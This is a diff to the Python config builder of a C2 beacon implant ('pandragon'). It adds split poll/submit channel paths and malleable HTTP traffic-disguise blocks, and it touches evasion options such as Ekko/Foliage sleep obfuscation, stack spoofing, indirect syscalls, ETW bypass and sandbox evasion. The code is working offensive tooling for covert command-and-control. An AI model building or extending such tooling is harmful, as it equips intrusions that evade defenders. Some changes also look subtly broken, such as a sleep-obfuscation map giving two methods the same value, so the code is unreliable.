@@ -116,15 +116,6 @@ def validate_config(config: dict, schema_path: str = None) -> bool:
             print("[!] 'Nt' functions are not allowed, use 'Zw' variant")
             return False
 
-    malleable = config.get('malleable_config', {})
-    payload_loc = malleable.get('payload_location', {})
-    if payload_loc.get('type') == 'query_param':
-        for ch in config.get('c2_channels', []):
-            if ch.get('http_method', 'GET') == 'POST':
-                print("[!] WARNING: POST method with query_param payload_location is unusual")
-                print("    Consider using GET for query_param or changing payload_location to 'body'")
-                break
-
     return True
 
 
@@ -151,24 +142,24 @@ def parse_iso_date(date_str: str) -> int:
 
 
 def build_c2_channel(channel: dict, config: dict = None) -> bytes:
-    """Build binary C2 channel entry with failover configuration and malleable mode"""
+    """Build binary C2 channel entry with poll/submit split paths and 4 malleable blocks"""
     type_map = {'HTTP': 1, 'HTTPS': 2, 'TCP': 3, 'PIPE': 4}
     channel_type = type_map.get(channel['type'], 0)
     if channel_type == 0:
         raise ValueError(f"Unknown channel type: {channel['type']}")
 
-    http_method = 1 if channel.get('http_method', 'GET') == 'POST' else 0
-
     host = channel['host'].encode('utf-8')
 
     if channel_type in (3, 4):
-        path = channel.get('path', '').encode('utf-8')
+        poll_path = channel.get('poll_path', '').encode('utf-8')
+        submit_path = channel.get('submit_path', '').encode('utf-8')
         ua = channel.get('user_agent', '').encode('utf-8')
     else:
-        path = channel['path'].encode('utf-8')
+        poll_path = channel['poll_path'].encode('utf-8')
+        submit_path = channel['submit_path'].encode('utf-8')
         ua = channel['user_agent'].encode('utf-8')
 
-    if len(host) > 255 or len(path) > 255 or len(ua) > 255:
+    if len(host) > 255 or len(poll_path) > 255 or len(submit_path) > 255 or len(ua) > 255:
         raise ValueError("C2 channel strings must be <= 255 bytes")
 
     if 'max_consecutive_failures' not in channel:
@@ -184,29 +175,38 @@ def build_c2_channel(channel: dict, config: dict = None) -> bytes:
     if not (1000 <= backoff_ms <= 300000):
         raise ValueError("backoff_sleep_ms must be 1000-300000")
 
+    # Header: type(1) + host_len(1) + poll_path_len(1) + submit_path_len(1) + ua_len(1) + reserved(1) + port(2) + max_failures(1)
     data = struct.pack('<BBBBBBHB',
                        channel_type,
-                       http_method,
                        len(host),
-                       len(path),
+                       len(poll_path),
+                       len(submit_path),
                        len(ua),
                        0,
                        channel['port'],
                        max_failures & 0xFF)
     data += struct.pack('<I', backoff_ms)
-    data += host + path + ua
+    data += host + poll_path + submit_path + ua
 
-    if channel_type in (3, 4):
-        malleable_mode = 0xFF
-    elif 'malleable_config' in channel and channel['malleable_config']:
-        malleable_mode = 0x01
-    else:
-        malleable_mode = 0x00
+    # Helper to determine malleable mode
+    def get_mode(key):
+        if channel_type in (3, 4):
+            return 0xFF
+        elif key in channel and channel[key]:
+            return 0x01
+        else:
+            return 0x00
 
-    data += struct.pack('<B', malleable_mode)
-
-    if malleable_mode == 0x01:
-        data += build_malleable_block(channel['malleable_config'])
+    for mode_key, block_key in [
+        ('poll_malleable_mode', 'poll_malleable_config'),
+        ('submit_malleable_mode', 'submit_malleable_config'),
+        ('poll_response_malleable_mode', 'poll_response_malleable_config'),
+        ('submit_response_malleable_mode', 'submit_response_malleable_config'),
+    ]:
+        mode = get_mode(block_key)
+        data += struct.pack('<B', mode)
+        if mode == 0x01:
+            data += build_malleable_block(channel[block_key])
 
     return data
 
@@ -234,7 +234,7 @@ def build_malleable_block(malleable: dict) -> bytes:
         if 'value' not in hdr:
             raise ValueError("http_headers[].value is required")
         name = hdr['name'].encode('utf-8')[:255]
-        value = hdr['value'].encode('utf-8')[:1023]
+        value = hdr['value'].encode('utf-8')[:255]
         data += struct.pack('<B', len(name))
         data += struct.pack('<B', len(value))
         data += name
@@ -254,9 +254,9 @@ def build_malleable_block(malleable: dict) -> bytes:
     if loc_type == 'query_param':
         if 'param_name' not in location or not location['param_name']:
             raise ValueError("payload_location.param_name is required for query_param type")
-        param_name = location['param_name'].encode('utf-8')[:63]
+        param_name = location['param_name'].encode('utf-8')[:255]
     else:
-        param_name = location.get('param_name', '').encode('utf-8')[:63]
+        param_name = location.get('param_name', '').encode('utf-8')[:255]
     data += struct.pack('<B', len(param_name))
     data += param_name
 
@@ -272,9 +272,9 @@ def build_malleable_block(malleable: dict) -> bytes:
     if loc_type == 'path':
         if 'path_suffix' not in location or not location['path_suffix']:
             raise ValueError("payload_location.path_suffix is required for path type")
-        path_suffix = location['path_suffix'].encode('utf-8')[:63]
+        path_suffix = location['path_suffix'].encode('utf-8')[:255]
     else:
-        path_suffix = location.get('path_suffix', '').encode('utf-8')[:63]
+        path_suffix = location.get('path_suffix', '').encode('utf-8')[:255]
     data += struct.pack('<B', len(path_suffix))
     data += path_suffix
 
@@ -283,6 +283,10 @@ def build_malleable_block(malleable: dict) -> bytes:
     if body_ct not in body_ct_map:
         body_ct = 'text/plain'
     data += struct.pack('<B', body_ct_map[body_ct])
+
+    cookie_name = location.get('cookie_name', '').encode('utf-8')[:255]
+    data += struct.pack('<B', len(cookie_name))
+    data += cookie_name
 
     return data
 
@@ -339,7 +343,7 @@ def build_config_blob(config: dict) -> tuple:
         options_bitfield |= 0x0080
 
     sleep_obf = config.get('sleep_obfuscation', 'none')
-    sleep_obf_map = {'none': 0, 'ekko': 1, 'foliage': 2, 'ekko_runtime': 3}
+    sleep_obf_map = {'none': 0, 'ekko': 1, 'morpheus': 2, 'foliage': 3, 'ekko_runtime': 3}
     sleep_obf_val = sleep_obf_map.get(sleep_obf.lower(), 0)
     if sleep_obf_val:
         options_bitfield |= (sleep_obf_val & 0x03) << 8
@@ -350,20 +354,20 @@ def build_config_blob(config: dict) -> tuple:
     if config.get('sleep_stack_spoof', False):
         options_bitfield |= 0x0800
 
-    indirect_pivot = config.get('indirect_syscall_pivot', 'ZwSetDefaultLocale')
-    if indirect_pivot:
-        indirect_pivot_bytes = indirect_pivot.encode('ascii')
-    else:
-        indirect_pivot_bytes = b''
-
-    if indirect_pivot:
+    if config.get('pad', False):
         options_bitfield |= 0x1000
+
+    indirect_pivot_bytes = b''
+    if config.get('use_indirect_syscalls', False):
+        pivot_str = config.get('indirect_syscall_pivot', 'ZwSetDefaultLocale')
+        if pivot_str:
+            indirect_pivot_bytes = pivot_str.encode('ascii')
 
     kill_date = 0
     if 'kill_date' in config and config['kill_date']:
         kill_date = parse_iso_date(config['kill_date'])
 
-    lazy_checkin_max = config.get('lazy_checkin_max', 0)
+    lazy_checkin_max = config.get('lazy_checkin_max', 1)
 
     plaintext = beacon_id
     plaintext += crypto_key
@@ -382,7 +386,7 @@ def build_config_blob(config: dict) -> tuple:
     pad_max = config.get('pad_max', 1024)
     plaintext += struct.pack('<H', pad_max)
 
-    num_spoof_frames = config.get('num_spoof_frames', 6 if config.get('sleep_stack_spoof', False) else 0)
+    num_spoof_frames = config.get('num_spoof_frames', 6)
     plaintext += struct.pack('<H', num_spoof_frames)
 
     max_response_size = config.get('max_response_size', 67108864)
@@ -403,12 +407,18 @@ def build_config_blob(config: dict) -> tuple:
     plaintext += struct.pack('<B', len(spawnto_x86_bytes))
     plaintext += spawnto_x86_bytes
 
-    global_malleable = config.get('malleable_config', {})
-    if global_malleable:
-        plaintext += b'\x01'
-        plaintext += build_malleable_block(global_malleable)
-    else:
-        plaintext += b'\x00'
+    for global_key in [
+        'poll_malleable_config',
+        'submit_malleable_config',
+        'poll_response_malleable_config',
+        'submit_response_malleable_config',
+    ]:
+        block = config.get(global_key, {})
+        if block:
+            plaintext += b'\x01'
+            plaintext += build_malleable_block(block)
+        else:
+            plaintext += b'\x00'
 
     work_hours = config.get('work_hours', {})
     if work_hours:
@@ -510,7 +520,7 @@ def generate_cpp_header(blob: bytes, output_path: str, nonce: bytes, config_key:
             transport_defines += f"// #define PANDRAGON_ENABLE_{transport} // Disabled\n"
 
     ekko_impl_map = {"ekko": 1, "ekko_runtime": 2, "foliage": 1}
-    ekko_impl_val = ekko_impl_map.get(sleep_obf_method.lower(), 1)
+    ekko_impl_val = ekko_impl_map.get(sleep_obf_method.lower(), 0)
 
     cpp_header = f'''// AUTO-GENERATED CONFIG HEADER
 // DO NOT EDIT - Generated by pandragon-config-builder
@@ -532,8 +542,8 @@ def generate_cpp_header(blob: bytes, output_path: str, nonce: bytes, config_key:
 #define PCFG_MAGIC 0x{pcfg_magic:08X}
 #define PCFG_VERSION 0x0002  // XChaCha20-Poly1305 encrypted
 
-// Ekko implementation selector
-// 1 = .obf section (static), 2 = runtime RX allocation (dynamic)
+// Ekko implementation selector (only relevant for ekko/ekko_runtime/foliage methods)
+// 0 = unused (current method doesn't use Ekko), 1 = .obf section (static), 2 = runtime RX (dynamic)
 #define EKKO_IMPL {ekko_impl_val}
 
 // Encrypted config blob
@@ -640,8 +650,9 @@ def main():
     print(f"Sleep:        {config.get('sleep_ms', 5000)}ms (+{config.get('jitter_pct', 0)}% jitter)")
     print(f"C2 Channels:  {len(config['c2_channels'])}")
     for i, ch in enumerate(config['c2_channels']):
-        http_method = ch.get('http_method', 'GET')
-        print(f"  [{i}] {ch['type']} {ch['host']}:{ch['port']}{ch['path']} (HTTP: {http_method})")
+        poll_path = ch.get('poll_path', '/')
+        submit_path = ch.get('submit_path', '/')
+        print(f"  [{i}] {ch['type']} {ch['host']}:{ch['port']}  poll={poll_path}  submit={submit_path}")
     print(f"Options:      sandbox_evasion={config.get('options', {}).get('sandbox_evasion', False)}, debug={config.get('options', {}).get('debug_mode', False)}, bypass_etw={config.get('options', {}).get('bypass_etw', False)}, indirect_syscalls={config.get('use_indirect_syscalls', False)}, lazy_unhook={config.get('lazy_unhook', False)}")
     print(f"Sleep Obf:    {config.get('sleep_obfuscation', 'none')}, wipe_pe={config.get('sleep_wipe_pe_headers', False)}, stack_spoof={config.get('sleep_stack_spoof', False)}, spoof_frames={config.get('num_spoof_frames', 6)}")
     if config.get('kill_date'):
@@ -652,28 +663,28 @@ def main():
     if spawnto:
         print(f"Spawnto:      x64='{spawnto.get('x64', 'default')}' x86='{spawnto.get('x86', 'default')}'")
 
-    malleable = config.get('malleable_config', {})
-    if malleable:
-        print("\nMalleable Config:")
-        wrapper = malleable.get('wrapper', {})
-        if wrapper.get('prefix') or wrapper.get('suffix'):
-            print(f"  Wrapper:    prefix='{wrapper.get('prefix', '')}' suffix='{wrapper.get('suffix', '')}'")
-        headers = malleable.get('http_headers', [])
-        if headers:
-            print(f"  Headers:    {len(headers)} custom header(s)")
-            for hdr in headers:
-                print(f"              {hdr['name']}: {hdr['value']}")
-        location = malleable.get('payload_location', {})
-        if location:
-            loc_type = location.get('type', 'query_param')
-            print(f"  Location:   {loc_type}")
-            if loc_type == 'query_param':
-                print(f"              param_name: {location.get('param_name', '')}")
-            elif loc_type == 'path':
-                print(f"              path_prefix: {location.get('path_prefix', '')}")
-                print(f"              path_suffix: {location.get('path_suffix', '')}")
-    else:
-        print("\nMalleable Config: None (default behavior)")
+    for block_name in ['poll_malleable_config', 'submit_malleable_config', 'poll_response_malleable_config', 'submit_response_malleable_config']:
+        block = config.get(block_name, {})
+        if block:
+            label = block_name.replace('_config', '').replace('_', ' ').title()
+            print(f"\nGlobal {label}:")
+            wrapper = block.get('wrapper', {})
+            if wrapper.get('prefix') or wrapper.get('suffix'):
+                print(f"  Wrapper:   prefix='{wrapper.get('prefix', '')}' suffix='{wrapper.get('suffix', '')}'")
+            headers = block.get('http_headers', [])
+            if headers:
+                print(f"  Headers:   {len(headers)} custom header(s)")
+                for hdr in headers:
+                    print(f"             {hdr['name']}: {hdr['value']}")
+            location = block.get('payload_location', {})
+            if location:
+                loc_type = location.get('type', 'query_param')
+                print(f"  Location:  {loc_type}")
+                if loc_type == 'query_param':
+                    print(f"             param_name: {location.get('param_name', '')}")
+                elif loc_type == 'path':
+                    print(f"             path_prefix: {location.get('path_prefix', '')}")
+                    print(f"             path_suffix: {location.get('path_suffix', '')}")
 
     post_build = config.get('post_build', {})
     append_strings = post_build.get('append', [])
@@ -711,31 +722,57 @@ def sync_beacon_to_server(beacon_id: str, crypto_key: str, config: dict = None, 
 
     allowed_routes = []
     for ch in config.get('c2_channels', []):
-        if ch.get('malleable_config'):
-            mc = ch['malleable_config']
-        elif config.get('malleable_config'):
-            mc = config['malleable_config']
-        else:
-            mc = None
+        def resolve_malleable(per_channel_key, global_key):
+            if ch.get(per_channel_key):
+                return ch[per_channel_key]
+            elif config.get(global_key):
+                return config[global_key]
+            else:
+                return None
+
+        poll_mc = resolve_malleable('poll_malleable_config', 'poll_malleable_config')
+        submit_mc = resolve_malleable('submit_malleable_config', 'submit_malleable_config')
+        poll_rc = resolve_malleable('poll_response_malleable_config', 'poll_response_malleable_config')
+        submit_rc = resolve_malleable('submit_response_malleable_config', 'submit_response_malleable_config')
 
         ch_type = ch.get('type', 'HTTP')
         is_tcp = ch_type in ('TCP', 'PIPE')
 
-        if is_tcp and mc:
-            wrapper = mc.get('wrapper')
-            effective_mc = {'wrapper': wrapper} if wrapper else None
-        else:
-            effective_mc = mc
+        def effective_config(mc):
+            if is_tcp and mc:
+                wrapper = mc.get('wrapper')
+                return {'wrapper': wrapper} if wrapper else None
+            return mc
 
         route = {
             "transport_type": ch_type,
-            "path": ch.get('path', ''),
+            "poll_path": ch.get('poll_path', ''),
+            "submit_path": ch.get('submit_path', ''),
             "port": ch.get('port', 0),
             "host": ch.get('host', ''),
             "user_agent": ch.get('user_agent', ''),
-            "http_method": ch.get('http_method', 'GET'),
-            "malleable_config": effective_mc,
+            "poll_malleable_config": effective_config(poll_mc),
+            "submit_malleable_config": effective_config(submit_mc),
         }
+
+        if poll_rc:
+            route['poll_response_config'] = {
+                'wrapper': {'prefix': poll_rc.get('wrapper', {}).get('prefix', ''), 'suffix': poll_rc.get('wrapper', {}).get('suffix', '')},
+                'headers': poll_rc.get('headers', {}),
+                'body_template': poll_rc.get('body_template', ''),
+                'status_code': poll_rc.get('status_code', 200),
+                'cookie_name': poll_rc.get('payload_location', {}).get('cookie_name', ''),
+            }
+
+        if submit_rc:
+            route['submit_response_config'] = {
+                'wrapper': {'prefix': submit_rc.get('wrapper', {}).get('prefix', ''), 'suffix': submit_rc.get('wrapper', {}).get('suffix', '')},
+                'headers': submit_rc.get('headers', {}),
+                'body_template': submit_rc.get('body_template', ''),
+                'status_code': submit_rc.get('status_code', 200),
+                'cookie_name': submit_rc.get('payload_location', {}).get('cookie_name', ''),
+            }
+
         allowed_routes.append(route)
 
     known["beacons"][beacon_id] = {
